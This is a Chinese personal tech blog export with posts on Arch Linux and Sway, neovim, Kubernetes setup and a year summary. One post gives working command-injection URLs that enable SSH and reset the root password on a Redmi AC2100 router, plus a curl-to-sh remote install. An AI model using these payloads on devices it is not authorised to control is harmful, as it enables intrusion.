Linux之后，我基本上不再改变自己的发行版了，只是会在图形界面折腾一些。2020年-2021年上半年我使用的都是KDE，好看是真好看，但是Bug也是真的致命，这其中我亲身经历过的至少三次重复出现在不同电脑（thinkpad T480出现过，thinkbook 14p 出现过）的bug就是盒盖睡眠失败，我不知道是谁引起的，是plasma还是conky还是别的什么组件，我不知道，我在日志里也查不到。别看这个问题好像没什么，但是作为一个笔记本用户，盒盖后放进包里是一个非常自然的行为，回到宿舍没有第一时间拿出电脑而是休息一会也是很正常的行为，但是休息完后发现自己的电脑在包里变成了一个铁板烧就不是一个正常的现象了。嘴硬的人当然会说thinkpad不是有指示灯吗？你看指示灯判断是否睡眠成功不就行了？且不说我后来的电脑thinkbook 14p是没有指示灯的，单就系统质量而言，一个系统每次使用的时候都需要用户小心翼翼盯着指示灯看，是否已经说明了这是一个糟糕的系统了？为什么换成thinkbook？就是因为这个bug把我的thinkpad的主板烧坏了！我曾以为这是thinkpad独有的问题，可是当thinkbook也发生同样问题的时候我对KDE彻底失望了，是的，这是一个很漂亮的桌面环境，定制性强又有很多特效，可是这一切都建立在一些不稳定的bug上的时候，这些特效会更多扮演起bug的导火索角色。\u003c/p\u003e\n\u003cp\u003e经历过KDE的bug后，我对复杂的桌面环境产生了恐惧，他们就像是一枚不定时炸弹。在这个前提背景下，我接触并开始使用SwayWM，一直到今天，我也还在使用，而那个致命Bug，已经离我远去。\u003c/p\u003e\n\u003ch2 id=\"体验\"\u003e体验\u003c/h2\u003e\n\u003cp\u003e得益于Arch Linux庞大的用户群，Arch 的软件包生态在一众发行版中可以说是称王称霸了，我举一个例子，你能想象在Linux的软件仓库中会出现deepin-wine魔改后的腾讯系软件吗？\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"image-20221217115944914.png\" alt=\"image-20221217115944914\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003e每次看到其他发行版用户手动下载deb然后安装的时候，我都会产生一种他们是不是在用windows的错觉，并不是看不起别的发行版，只是各有分工和侧重点，比如Arch的定位是桌面端用户，而很多别的发行版的定位是服务器，我不会用别的发行版当作我的桌面系统，就像我不会把Arch装在服务器上一样。用统一的包管理器管理软件包肯定是有好处的，能够大大减轻用户的心智负担。\u003c/p\u003e\n\u003cp\u003e至于网络上提到的Arch Linux不稳定、容易滚挂的问题，不好意思，我用了两年Arch了，每天都执行\u003ccode\u003eyay -Syyu\u003c/code\u003e，从来没有出现滚挂的问题，相反，我目前所遇到的半数Linux相关问题，都是因为系统软件或者依赖库过于老旧而导致的，更新后就可以解决。Linux不是Windows，如果你不想要更新，那么有两种选择，第一种，锁定自己的软件版本，然后在每次安装新软件的时候单独解决依赖问题；第二种，回去用windows。\u003c/p\u003e\n\u003cp\u003e说完了Arch Linux，再来说说Sway，这是一个简单的wayland窗口管理器，为什么用wayland，因为我不希望自己的图形界面建立在一个老旧而难以维护的基础设施之上，那给我的感觉就好像我在使用另一个plasma。诚然，wayland还有很长的一段路要走，很多桌面软件都不得不借助xwayland才能在其上运行，经过实际使用，除了在4k屏幕上xwayland有问题之外，其他情况下还是可以完美工作的。当然，部分软件是有问题的，比如腾讯会议的桌面共享功能，但是也已经有了曲线救国的办法，所以现在wayland的生态已经比之前要好一些了，当我看到linux qq内测群里有人提出wayland下的问题以及要求兼容wayland的时候，我就相信未来还会更好。\u003c/p\u003e\n\u003cp\u003eSway是一个窗口管理器，开发者做的事情是在wayland下复刻一个i3wm出来。窗口管理器的好处是我现在更多依赖键盘而不是鼠标了，可以减少对视觉聚焦于鼠标这种行为的依赖，转而更多依赖自己的触觉，另外，更少的特效和更简洁的设计不仅让我的系统大大增强了稳定性（据一位用KDE的同学说，直到今天，用KDE只要一周不关机就必定会崩溃），还让我自己更加专注于手头的工作（平铺式窗口管理器的统一好处）。不好的地方当然也有不少，比如初次接触的时候要花很多时间去配置和适应，比如每次修改操作键位的时候都需要一定时间去重新适应，比如fcitx5在某些软件下面无法工作或者是有缺陷（这不是fcitx5的锅），比如它让我认识到自己是一个很笨蛋的人，使用了一年了，让我时不时就发现自己的操作习惯可以有优化空间，比如：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e在按win+数字键的时候，用大拇指去按是很扭曲的姿势，**一个更加自然的姿势是用左手的掌心左下（手背视角）的部分去压win键，然后用手指去按数字键。**如果要按ctrl+win，就用同样的部位压住两个键，这个难度会大一些，大概确实还可以优化的。\u003c/li\u003e\n\u003cli\u003e调整窗口大小的时候，进入resize模式然后用键盘去按是很低效的行为，相反，这种时候依赖鼠标不是什么坏事，通过把鼠标悬停在窗口上然后按住右键进行拖拽就可以实现快速的窗口大小调整。\u003c/li\u003e\n\u003cli\u003escratchpad中更适合使用tab模式。\u003c/li\u003e\n\u003cli\u003e有的时候在两个workspace之间切换会很频繁，这个时候更适合用\u003ccode\u003eworkspace back_and_forth\u003c/code\u003e而不是一直执着于用数字键去切换，或者使用鼠标的滚轮来切换，这也是一个不错的主意。\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e除此之外还有一个小的优点，在sway下可以给不同键盘换上不同的布局，这点对我而言是刚需，但是在xorg下面，这种操作往往只能将同一个布局应用于所有的键盘，一旦布局出现了问题导致键盘不可用，那么所有的键盘都会变得不可用。\u003c/p\u003e\n\u003cp\u003e最后，我和大部分的geek用户不一样，我比较笨，只是一个普通用户，我做不到也不想去和他们一样视鼠标如洪水猛兽，相反，sway下我还是会频繁使用鼠标，对我来说用鼠标去交互两个窗口的位置依旧是比用键盘更加高效的操作。\u003cstrong\u003e所以我想说的是，追求属于自己的实用性，你可以去参考别人的建议，但是最终还是要找到属于你自己的习惯。\u003c/strong\u003e 对于我个人来说， 我也完全不排除在plasma的bug修复后回到plasma的可能性，毕竟老牌桌面。\u003c/p\u003e\n\u003cp\u003e列出我使用的软件：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e桌面环境\n\u003cul\u003e\n\u003cli\u003eSwayWM（窗口管理）\u003c/li\u003e\n\u003cli\u003ewaybar（信息展示栏）\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e终端\n\u003cul\u003e\n\u003cli\u003ealacritty\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e浏览器\n\u003cul\u003e\n\u003cli\u003efirefox-developer-edition （主力）\u003c/li\u003e\n\u003cli\u003echrome\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e输入法\n\u003cul\u003e\n\u003cli\u003efcitx5\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e代码编辑\n\u003cul\u003e\n\u003cli\u003eNeovim（主力）\u003c/li\u003e\n\u003cli\u003eVscode（副手）\u003c/li\u003e\n\u003cli\u003eJetbrains\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e做笔记\n\u003cul\u003e\n\u003cli\u003eNeovim-qt\u003c/li\u003e\n\u003cli\u003ezotero\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e文件浏览器\n\u003cul\u003e\n\u003cli\u003eranger\u003c/li\u003e\n\u003cli\u003edolphin\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e看论文\n\u003cul\u003e\n\u003cli\u003ezotero\u003c/li\u003e\n\u003cli\u003eokular\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e游戏\n\u003cul\u003e\n\u003cli\u003esteam（泰拉瑞亚、黑暗之魂……）\u003c/li\u003e\n\u003cli\u003ewaydroid（明日方舟）\u003c/li\u003e\n\u003cli\u003eHMCL（minecraft）\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e工具替代\n\u003cul\u003e\n\u003cli\u003eexa 替代 ls\u003c/li\u003e\n\u003cli\u003ezoxide 替代 cd\u003c/li\u003e\n\u003cli\u003escp 替代 cp\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"trouble-shooting\"\u003eTrouble Shooting\u003c/h2\u003e\n\u003ch3 id=\"关机的时候出现-a-stoping-job-is-running-for-xxx-hangout\"\u003e关机的时候出现 a stoping job is running for xxx hangout\u003c/h3\u003e\n\u003cp\u003e修改\u003ccode\u003e/etc/systemd/system.conf\u003c/code\u003e\u003c/p\u003e","title":"使用Arch Linux + Sway一年后"},{"content":" 在消磨三年时光之后，我终于明白这个编辑器还远远称不上稳定，在道路的尽头之前，我能做的其实只有观望。\n记得之前看到过一个例子, 发动机能够成功的关键在于它成功将\u0026quot;运动\u0026quot;这一复杂的行为集合抽象成了旋转运动, 一切运动皆旋转, 所以发动机只需要做好旋转就可以了, 用户可以踩油门, 可以拧把手, 可以做出各种各样不同的操作行为, 但是这些行为具体作用到发动机的时候, 就统统变成了旋转多快, 往哪里旋转. 由于发动机对运动集合进行了高度的抽象, 因此使得其原理变得简单而易于迁移, 进而让发动机的抽象成为了动力机器的事实意义上的标准. 从一个理科生的视角来看, 这是一个浪漫且实用的设计.\n再来看另一个极端的案例, 假设有这么一台机器, 它并不像发动机那样对运动集合进行抽象, 它将所有的运动方式都保存在一张HashMap中, 但是它提供了一个轮盘, 用户只需要将轮盘转动到合适的位置, 就可以从HashMap中找到用户所期望执行的运动方式. 这是一个很怪的案例, 因为它所做的正好与发动机所做的事情相反, 它并不对动力机器的行为做出抽象, 而是对用户的行为进行抽线, 将用户执行的所有操作都抽象为旋转. 当然, 这样的机器就算被发明出来, 也早就被彻底抛弃了, 但是类似的, 不那么极端的设计, 依旧存在, 比如这篇文章要说的vim.\nvim所提倡的全键盘操作确实让人眼前一新，其基本的操作逻辑是将用户的行为抽象为四个模式（Normal Insert Visual Command），之后的所有插件，不管是语法补全还是其他，都是在这个操作逻辑上进行的补充。不得不说，如果习惯了这样的操作逻辑，使用起来确实是比较舒适的，只要你不遇到一些问题\n忘记了键位 作为一个自定义程度极高的编辑器，自定义键位是不可避免的事情，并且由于vim缺乏有效的鼠标操作，所以需要定义键位数量和普通的IDE相比会多得多。举个例子，在IDE下用括号去包裹一个词，需要用鼠标选中那个字符串然后按下括号就可以了，但是在neovim中，需要使用插件surround.nvim，使用ysiw(为它添加，且不说这个操作行为需要你连续又快速按下五个键（慢了nvim就不认了），这个键位只适用于光标所处在的词语，如果要为一段话添加呢？那还会有别的键位，但是如果是鼠标的话就还是同样的操作。\n从这里就可以暴露出vim/neovim的第一个问题：全键盘操作迫使vim用户将更多的键位分配给更加细粒度的操作行为上，给原本疲于应付工作的大脑再加上一根稻草\n插件之间缺乏隔离 这个问题在我折腾期间确实存在，即便不明显，但是时不时会跳出来绊你一下。我在github的issue中看到过太多因为安装了别的插件而导致这个插件的运行出现了问题。举一个恼人的典型案例，这个案例也是让我第一次对neovim的插件生态产生了怀疑，那就是nvim-tree，这个插件很好，非常好，只是有一个小小的缺点：它做不到自动退出，简单来说，就是当你关掉当前编辑的这个文件之后，如果你的nvim-tree开着，那么就要多执行一次:q，这是一个很恼人的问题，而在nvim-tree的wiki上写到\nUnfortunately such functionality is problematic and is not present in nvim-tree:\nvim events are the only mechanism we can use for auto close vim events are unpredictably ordered, especially when other plugins and automation are involved BufEnter is the last event that can be acted upon and that event can have side effects Event nesting may be disabled by other plugins / automation, resulting in missing events other plugins ! 这不禁让我想到了旧版火狐插件，高自由度必定和隔离性有序性相互违背，尤其是对于正处于新兴阶段迅猛发展的neovim更是如此。\n插件生态的混乱 我在写这篇吐槽的前一天逐个检查我平时使用的插件，发现已经有几个插件的作者在github页面上写着类似于“不再更新了，去用xxx吧，那个更好”的话，这距离我上次检查才过去两个月啊。有些作者仅仅只是觉得自己写的东西比较差就索性不再更新了，emmmmmm，确实，不能怪作者，要怪就怪用户倒霉吧，谁让这是开源呢，包括我在内的大部分用户只能被迫从一个插件换到另一个插件，从kommentary换到Comment.nvim，从lspinstaller换到mason.nvim……我不知道我在追逐什么，在我这个外行看来他们做的事情不应该是一样的吗？\n怀疑越积越多，最终我累了，我停下了脚步，选择了vscode。或许哪天等插件生态逐渐稳定下来之后我会再回来看看吧。\n写这么多，不是因为讨厌，只是为了记录。回望neovim这几年的发展，可以看出其势头非常凶猛，尤其是在这两年增加了lsp和treesitter之后，希望它未来会越来越好吧，因为它对我来说不仅仅是一个编辑器了，它还是我大学懵懂时期乐趣的一部分，是回忆里的一块拼图了。\n","permalink":"https://ch3n9w.github.io/posts/tech-thinking-about-vim/","summary":"\u003cblockquote\u003e\n\u003cp\u003e在消磨三年时光之后，我终于明白这个编辑器还远远称不上稳定，在道路的尽头之前，我能做的其实只有观望。\u003c/p\u003e\n\u003c/blockquote\u003e","title":"vim/neovim 的问题"},{"content":" 在争取自由这个宏大命题下, 上网自由可以算得上一件\u0026quot;小事\u0026quot;, 然而越是小事, 越与我们的日常息息相关.\n事情的起因是装kubernetes遇到了网络问题且换镜像源无用, 想了想自己对在路由器上fq也感兴趣了很久, 索性查查看, 没想到还挺容易的.\n开启ssh ac2100这个型号的路由器存在命令注入漏洞, 可以通过该漏洞开启clash.\n登陆到路由器面板,从url中复制stok,替换下面的stok\n# 命令执行漏洞开启ssh http://192.168.31.1/cgi-bin/luci/;stok=\u0026lt;STOK\u0026gt;/api/misystem/set_config_iotdev?bssid=Xiaomi\u0026amp;user_id=longdike\u0026amp;ssid=-h%3B%20nvram%20set%20ssh_en%3D1%3B%20nvram%20commit%3B%20sed%20-i%20\u0026#39;s%2Fchannel%3D.*%2Fchannel%3D%5C%22debug%5C%22%2Fg\u0026#39;%20%2Fetc%2Finit.d%2Fdropbear%3B%20%2Fetc%2Finit.d%2Fdropbear%20start%3B # 命令执行漏洞修改ssh密码, 这里用的密码为admin http://192.168.31.1/cgi-bin/luci/;stok=\u0026lt;STOK\u0026gt;/api/misystem/set_config_iotdev?bssid=Xiaomi\u0026amp;user_id=longdike\u0026amp;ssid=-h%3B%20echo%20-e%20\u0026#39;admin%5Cnadmin\u0026#39;%20%7C%20passwd%20root%3B 然后在自己的电脑上ssh连接,密码admin\nssh root@192.168.31.1 如果报错了,就在.ssh/config中添加\nHost 192.168.31.1 PubkeyAcceptedAlgorithms +ssh-rsa HostkeyAlgorithms +ssh-rsa 安装clash ssh登陆到路由器后, 运行:\nexport url=\u0026#39;https://cdn.jsdelivr.net/gh/juewuy/ShellClash@master\u0026#39; \u0026amp;\u0026amp; sh -c \u0026#34;$(curl -kfsSl $url/install.sh)\u0026#34; \u0026amp;\u0026amp; source /etc/profile \u0026amp;\u0026gt; /dev/null 面板安装不成功的话就换源装.其他就跟着脚本的提示走就可以了\n","permalink":"https://ch3n9w.github.io/posts/tech-clash-ac2100/","summary":"\u003cblockquote\u003e\n\u003cp\u003e在争取自由这个宏大命题下, 上网自由可以算得上一件\u0026quot;小事\u0026quot;, 然而越是小事, 越与我们的日常息息相关.\u003c/p\u003e\n\u003c/blockquote\u003e","title":"在红米ac2100路由器上开启clash"},{"content":" 超元域这个词, 出自雪崩这本书, 人们在这个虚拟世界中可以随意行事, 尽情做自己, 这也是我的初衷: 把发言权还给我\n对于自己的博客, 我其实是抱着一种矛盾的心态去管理的: 一方面, 在阿里云买了服务器将自己的博客部署在上面后确实让国内用户可以看到我写的垃圾了, 之前无意认识的一个师傅就告诉我说以前还看过我的博客, 让我觉得有些开心; 另一方面, 我又必须在国内备案, 需要实名制, 需要在博客的底部悬挂一个可笑的备案号来表达自己已经被招安了, 既然被招安, 那么很多我想说的话, 我想分享的有价值的东西, 就不敢说也不想说了.\n这种心态困扰了我很久, 也因为我确实不再搞安全了, 于是就没再更新有价值的东西了. 这种情况一直持续, 直到发现其实我的东西并没有什么人会来看, 也没有技术佬对我文章里的瑕疵和动机指指点点, 写博客的价值更多是鞭策自己而不是对别人. 想开了之后我就再无顾忌了, 正好阿里云的服务器也到期了, 原来的博客销毁, 我把博客放在了git page上, 去掉了那如同罪犯烙印般的国内备案号.\n曾经的自己, 是真的想一直让国内人看到自己写的博客的, 为此那个时候我续费了三年的服务器, 但是这两年的舆论审查, 权力滥用还有网络暴力, 让国内的环境看起来越来越有黑暗森林的味道了. 失望和无奈让我最终放弃了当初天真的想法, 正好, 有幸在b站上通过看瓶子君的直播间知道了斯诺登的永久记录这本书, 于是有幸拜读了一下, 给我印象最深刻的片段如下:\n我回头重看以前的帖文,开始畏畏缩缩起来。当时说的话有一半是无心之论,我只想引人注意,没想过有一天要对一位戴着方框眼镜的白发男子做解释,他的视线扫过贴着“永久保存记录”标签的巨型资料夹。而另一半言论,我想当时是有心这么说的,这让情况更糟,因为我不再是当年那个懵懂无知的孩子,我已经长大成人。连我都认不出自己说过这样的话。还有个问题是,现在我对那些激情又冲动的观点心生反感。我发现自己要跟幽灵争辩,要跟愚蠢、幼稚、偶尔露出残酷面的自我打一架,但这样的我已不复存在。想到可能永远被这种鬼魅纠缠,我没办法忍受,可又不知有什么最好的方法来表达我的自责懊悔,让我与其保持距离,我也疑惑究竟该不该这么做。那些我后悔不已却又几乎遗忘的过去,依旧通过科技死缠着我不放,实在令人发指。\n我们这个最先在网络环境中成长的世代,对这样的问题再熟悉不过。我们发掘探索几乎完全不受监督的身份,从来不会天真地以为我们说过的鲁莽言论和黄色笑话能一笔勾销,事实会永久保存下来,而且有一天会期待我们做出解释。每个人想必都有在网上发布尴尬帖文的经验,不然就是简讯或电子邮件,可能会害得他们被炒鱿鱼。在找到工作前有上网经验的人,我敢肯定对这样的情况感同身受。\n不过我的情况又另当别论,我大部分的网络留言板能删除旧帖文,我的帖文可以在不到一小时内全部删除,那或许是这世上最轻而易举的事。相信我,我考虑过这么做。\n可是我终究没这么做,某种原因阻止了我,就是觉得不该如此。让我的帖文从地球上消失不犯法,而且万一有心人想去挖,我也不用冒着身家调查不合格的风险。不过,删除帖文的可能后果让我心烦意乱,那么做只会强化网络生活中的一些最腐蚀人心的训诫:没人有犯错空间,凡是犯错者,都要一辈子为自己的错误负责。我在意的倒不是文字记录是否完美无缺,而是灵魂的完整性。我不想活在一个人人必须假装完美的世界里,那样的世界没有我和朋友的容身之处。抹掉网上的评论,等于抹杀了我是谁,我从哪里来,我走了多远。否定年少时的我,等于否定现在的我的合法性。\n我决定留下这些网络评论,想出与它们共处的方式。我甚至拿定主意,既然要忠于这个立场,就得继续在网络上发文。我也及时长大,不再对标新立异的意见照单全收,不过我的原始冲动依然没有动摇,即便只因为那是我迈向成熟的重要一步。既然抹不掉网络上那些令我们丢脸羞愧的言行,我们能做的就是控制自己的反应——是为了这些过去自我折磨,还是接受过去带给我们的教训,然后成长、前进。\n那是我在闲散时期想到的第一件事,或许可以称之为原则,尽管执行不易,我仍努力靠它过活。\n必须承认自己做不到斯诺登那么坦然. 我更换了自己原本足够暴露隐私的id, 尽力在网络上扫清自己曾经留下的痕迹, 然后选择在这个隐蔽的地方自己保留自己的发言权, 重新开始.\n只是在这个过程中, 由于自己的备份做的不好, 很多图片文件随着时间推移遗失了, 真的挺后悔的. 如果有人看的时候发现图片缺失, 那么真的很抱歉浪费了你的时间.\n博客于我的意义, 首先是记录. 我当然是有自己的笔记软件的, 但是从2019年开始, 我先后使用了typora, joplin, trilium, obsidian, 期间也经历过数次系统重装, 在这折腾的过程中, 不少的笔记遗失了, 当然最重要的原因依旧是我没有做好备份,\n这个时候, 博客的价值就出来了, 每当我看到自己曾经刷bugku的笔记还在博客上好端端的呆着, 尽管它写的很烂, 但是每次看到, 我都会想起2018年的冬天自己笨拙地看着网上的wp复现然后用word和Atom记笔记的自己, 真的很怀念.\n另一个作用是鞭策自己输入, 从而反向推动自己多加学习, 当然, 必须是在我对自己负责的心态下才可以达到这样的效果.\n不过, 如前文所述, 我现在已经不太会关心别人是怎么看待我的博客了, 无论你是觉得这里水分过多技术过少, 还是技术文章过于垃圾过时, 都无所谓, 我写我的, 你自便.\n","permalink":"https://ch3n9w.github.io/posts/gossip-boring-note-md/","summary":"\u003cblockquote\u003e\n\u003cp\u003e超元域这个词, 出自雪崩这本书, 人们在这个虚拟世界中可以随意行事, 尽情做自己, 这也是我的初衷: 把发言权还给我\u003c/p\u003e\n\u003c/blockquote\u003e","title":"服务器过期之后"},{"content":"环境问题, 一生之敌.\n准备 网络问题 这是最重要的问题, 国内的那些借助于镜像源的扭曲解决方案在我这里不好使. 推荐在路由器上安装clash\nvirtualbox安装ubuntu18.04 这步没什么好讲的, 要注意的是使用桥接网络模式, 为什么? 因为集群内通信, 如果不使用桥接模式, 那就只能使用 NAT network来进行node之间通信+Host Only让宿主机能够连接+NAT让虚拟机可以连接到外网去, 在这种情况下, 环境就会变得很复杂, 所以还是选择桥接模式比较好.\n那桥接模式有什么不好的地方吗? 有, 如果你的宿主机开着代理, 桥接模式是走不了你宿主机的代理的, 即便开启了Allow LAN也无济于事, 除非你桥接到了代理软件的虚拟网卡上, 但是这条路我没走通, 所以最后选择了在路由器上安装clash\n网卡类型使用NAT+Host Only就可以了, Host Only那里最好新建一张网卡, NAT用于集群的对外网络请求(下载之类的), 宿主机上使用clash tun或者dae或者v2raya都可以开启透明代理来让虚拟机可以连接外网.\n然后在netplan中启用第二张网卡并设置静态ip, 例如\nnetwork: ethernets: enp0s3: dhcp4: true enp0s8: dhcp4: no addresses: [192.168.59.125/24] version: 2 关闭swap swayoff -a # 临时禁用 如果永久禁用, 修改/etc/fstab\n安装依赖 docker apt-get update \u0026amp;\u0026amp; apt-get install -y \\ apt-transport-https ca-certificates curl software-properties-common gnupg2 curl -fsSL https://download.docker.com/linux/ubuntu/gpg | apt-key add - add-apt-repository \\ \u0026#34;deb [arch=amd64] https://download.docker.com/linux/ubuntu \\ $(lsb_release -cs) \\ stable\u0026#34; apt-get update \u0026amp;\u0026amp; apt-get install -y \\ containerd.io=1.2.13-1 \\ docker-ce=5:19.03.8~3-0~ubuntu-$(lsb_release -cs) \\ docker-ce-cli=5:19.03.8~3-0~ubuntu-$(lsb_release -cs) cat \u0026gt; /etc/docker/daemon.json \u0026lt;\u0026lt;EOF { \u0026#34;exec-opts\u0026#34;: [\u0026#34;native.cgroupdriver=systemd\u0026#34;], \u0026#34;log-driver\u0026#34;: \u0026#34;json-file\u0026#34;, \u0026#34;log-opts\u0026#34;: { \u0026#34;max-size\u0026#34;: \u0026#34;100m\u0026#34; }, \u0026#34;storage-driver\u0026#34;: \u0026#34;overlay2\u0026#34; } EOF systemctl daemon-reload; systemctl restart docker kubernetes sudo apt-get update \u0026amp;\u0026amp; sudo apt-get install -y apt-transport-https curl curl -s https://packages.cloud.google.com/apt/doc/apt-key.gpg | sudo apt-key add - cat \u0026lt;\u0026lt;EOF | sudo tee /etc/apt/sources.list.d/kubernetes.list deb https://apt.kubernetes.io/ kubernetes-xenial main EOF sudo apt-get update; apt-get install -y kubelet=1.25.3-00 kubeadm=1.25.3-00 kubectl=1.25.3-00; apt-mark hold kubelet kubeadm kubectl echo \u0026#39;alias k=kubectl\u0026#39; \u0026gt;\u0026gt; ~/.bashrc ; source ~/.bashrc 清理 kubeadm reset rm -r ~/.kube /etc/containerd/config.toml /etc/cni/net.d systemctl restart containerd 集群安装 master setup kubeadm init --pod-network-cidr=10.244.0.0/16 --service-cidr=10.96.0.0/12 --apiserver-advertise-address=192.168.59.126 mkdir -p $HOME/.kube;sudo cp -i /etc/kubernetes/admin.conf $HOME/.kube/config;sudo chown $(id -u):$(id -g) $HOME/.kube/config 然后安装flannel, 下载 https://raw.githubusercontent.com/coreos/flannel/master/Documentation/kube-flannel.yml , 然后往其中添加网卡的名称\n... containers: - name: kube-flannel image: docker.io/flannel/flannel:v0.21.4 #image: docker.io/rancher/mirrored-flannelcni-flannel:v0.21.4 command: - /opt/bin/flanneld args: - --ip-masq - --kube-subnet-mgr - --iface=enp0s8 \u0026lt;-- 添加 ... 然后执行kubectl apply -f kube-flannel.yml就行\nworker setup rm /etc/containerd/config.toml systemctl restart containerd docker kubelet kubeadm join 10.0.2.15:6443 --token am85zn.iymt1qn11oel8ktn \\ --discovery-token-ca-cert-hash sha256:ede03b0defa4929ccfcbf6a21ae924cdd6947c5fe6a0090144c3ccea00475344 然后修改10-kubeadm.conf添加静态ip地址就完成了.\n部署应用 来装个简单的应用\napiVersion: apps/v1 kind: Deployment metadata: # 部署名字 name: test-k8s spec: replicas: 2 # 用来查找关联的 Pod，所有标签都匹配才行 selector: matchLabels: app: test-k8s # 定义 Pod 相关数据 template: metadata: labels: app: test-k8s spec: # 定义容器，可以多个 containers: - name: test-k8s # 容器名字 image: ccr.ccs.tencentyun.com/k8s-tutorial/test-k8s:v1 # 镜像 然后部署service\napiVersion: v1 kind: Service metadata: name: test-k8s spec: selector: app: test-k8s type: NodePort ports: - port: 8080 # 本 Service 的端口 targetPort: 8080 # 容器端口 nodePort: 31000 # 节点端口，范围固定 30000 ~ 32767, 虚拟机外的机器可以通过该端口访问内部服务 来访问一下, 顺利就好\n","permalink":"https://ch3n9w.github.io/posts/tech-k8s-setup/","summary":"\u003cp\u003e环境问题, 一生之敌.\u003c/p\u003e","title":"virtualbox中搭建kubernetes集群"},{"content":"这是一篇拖延了很久的年度总结,在下决心写它的时候,我已经从过年开始无所事事地玩了十几天的游戏了,本来说好要在过年那天写的总结也一直到现在才开始动笔,着实是惭愧.\n今年值得记录的一些事件:\n毕业设计的经过 在本科学校的最后时光 入学研究生院校 今年的状态: 依然在迷茫和纠结之中,但是逐渐意识到只要行动起来的话,自己的道路会越来越清晰的.\n21年年初在家的时候,我在写自己的毕业设计\u0026ndash;一个基于区块链的商品交易系统.在看了一些b站的关于vue的视频之后我写了一个非常简陋的前端页面,毕业设计的后端部分使用了koa框架并运行在ganache环境中,至于智能合约部分的内容总体上在回家前就写差不多了.但其实自己原本的打算是在回家之前就把毕业设计做完的,但是在经历了实习被拒事件之后心态彻底摆烂,有一点没一点的做毕业设计,以至于到寒假结束后又花了一些时间才差不多算完成.\n记得第一次写完毕设论文之后给老师看还被痛骂了一通,拿回去认认真真的进行了大改,这才意识到毕业设计最关键的部分是毕业论文,于是接下来的时间里面,格式问题和篇幅内容成了我最关注的东西.在这里也必须感谢我的指导老师在凌晨时分还给我发指导意见.\n到了毕业设计的最后阶段,先是去项目为导向的毕业设计验收现场,在被灵魂质问一句\u0026quot;你这个系统农民能用吗\u0026quot;之后黯然退下,然后是在毕业答辩环节非常快速而简略地阐述了我的工作内容.也正是在答辩环节我才发现有的人的毕设真是非常硬核,虽然其中有些是拿之前做过的成果来用的,也有人真就硬划水,不仅实验数据是模拟生成的,整个毕设还拆成三个部分给三个人做,真是无了个大语.不管怎么样,在结束答辩回到宿舍楼活动室中时,看着那些焦急而又紧张等待答辩的眼神时,我才意识到,都结束了,不仅要和那些熬夜改论文的夜晚说再见了,也要和那些为了绩点焦头烂额复习的日夜和考场上紧张答题的分秒说再见了.那些因为课程和成绩或是焦虑或是迷茫的岁月终于要和我说再见了,尽管我并不讨厌它们,甚至哪怕我有时会因为保研制度而满腹牢骚,却也不得不承认,这些经历已经成为了自己的烙印.\n随着毕业的临近,降级了的室友jm也要离开学校去参加几个月的实习了.我们宿舍最后一次吃饭是在食堂二楼的烤肉店中,第二天,宿舍就只剩下三人了.\n毕设结束后的时间里,时而伤感的自己急需一个可以投入精力的事情来控制自己的情绪,于是巧合之下,我接触了泰拉瑞亚,并在2D世界里面度过了大学的最后时光,如今想来,竟莫名其妙地和大一寒假玩黑魂二时候的时光发生了呼应,就好像自己其实一直都没有改变.\n至此,我的大学生活,光荣谢幕!感谢我遇到的每一个老师每一位同学每一位学长!感谢ao子哥柴子哥安子哥唐老板天男哥潼大佬源子哥p师傅带我打CTF还陪我扯du子,感谢我的每一个室友让我的大学时光充满了石乐志的笑声.\n接下来是我进入国科大之后的经历.在入学前的暑假,我经历了很长时间的迷茫期,想着要不放弃网安方向吧,但是入学后忙起来了也没空想这么多,反而还重新振作并安慰自己这些都是技术,以后干什么也都还不一定,现在的学习方向就凭自己兴趣来就好了,毕竟人太功利会活得很累的.这个学期也读了 做时间的朋友 这本书,书中谈到说兴趣不是天生的,等到一个人擅长某个方向之后自然就会对这个方向产生热爱,让我大受启发,不再裹足不前.\n在国科大,除了自己研究之外,偶尔会有从师兄那里来的小任务.剩下的很多时间都会在课内和课外扯皮还有CTF中度过,大体上比较悠闲.当然期末的时候冲一波考试及格是肯定的,但是不会再像本科那么卷了.下半个学期应该就要确定自己的方向了,这个寒假估计也是最后一个可以悠闲玩游戏的假期了.\n在国科大还认识了很多大佬,有年纪轻轻发顶会的室友,也有炒币风生水起的隔壁老哥,真是望尘莫及.自己也加入了nese的乙队,虽然上次比赛还是差一点就可以进甲队了,但是这学期跟着打比赛着实学习到了很多.\n那么,新年也要继续努力呀,旅行者!\n","permalink":"https://ch3n9w.github.io/posts/gossip-2021-summary/","summary":"\u003cp\u003e这是一篇拖延了很久的年度总结,在下决心写它的时候,我已经从过年开始无所事事地玩了十几天的游戏了,本来说好要在过年那天写的总结也一直到现在才开始动笔,着实是惭愧.\u003c/p\u003e","title":"2021年度总结"},{"content":"尝试学pwn,放弃学pwn\nstart 下载, 反编译获得如下代码\n.text:08048060 public _start .text:08048060 _start proc near ; DATA XREF: LOAD:08048018↑o .text:08048060 push esp .text:08048061 push offset _exit .text:08048066 xor eax, eax .text:08048068 xor ebx, ebx .text:0804806A xor ecx, ecx .text:0804806C xor edx, edx .text:0804806E push \u0026#39;:FTC\u0026#39; .text:08048073 push \u0026#39; eht\u0026#39; .text:08048078 push \u0026#39; tra\u0026#39; .text:0804807D push \u0026#39;ts s\u0026#39; .text:08048082 push 2774654Ch .text:08048087 mov ecx, esp ; addr .text:08048089 mov dl, 14h ; len .text:0804808B mov bl, 1 